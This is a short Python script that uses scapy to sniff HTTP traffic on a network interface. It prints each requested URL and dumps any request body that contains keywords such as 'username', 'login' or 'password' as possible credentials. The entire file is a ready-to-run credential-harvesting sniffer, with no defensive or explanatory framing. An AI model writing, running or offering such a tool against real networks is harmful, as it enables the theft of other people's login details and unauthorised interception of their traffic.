#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface,store=False,prn=process_sniffed_packet)#udp is inf vid ,img type
    #port 80 is inf to sent to web server

def geturl(packet):
    return packet[http.HTTPRequest].Host+packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = (packet[scapy.Raw].load)
        keywords = ["username", "user", "login", "password", "pass","uname","name"]
        for keyword in keywords:
            if (keyword) in load:
                return load



def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = geturl(packet)
        print("[+] HTTP Request >> "+url)
        login_inf = get_login_info(packet)
        if login_inf:
            print("\n\n[+] Possible username/password > " + login_inf + "\n\n")

sniff("eth0")